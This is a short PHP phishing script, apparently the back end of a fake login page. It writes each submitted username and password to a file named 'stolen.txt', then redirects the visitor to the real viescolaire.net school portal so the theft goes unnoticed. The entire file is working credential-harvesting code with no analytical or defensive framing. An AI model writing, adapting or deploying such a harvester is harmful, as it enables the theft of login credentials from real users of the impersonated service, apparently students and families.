<?php
if ($_POST['submit']){

$myFile = "stolen.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = "username: " . $_POST['user'] . "\n";
fwrite($fh, $stringData);
$stringData = "password: " . $_POST['pass'] . "\n";
fwrite($fh, $stringData);
fclose($fh);

} ?>

<script>location.href='https://www.viescolaire.net/accueil_0.aspx';</script>
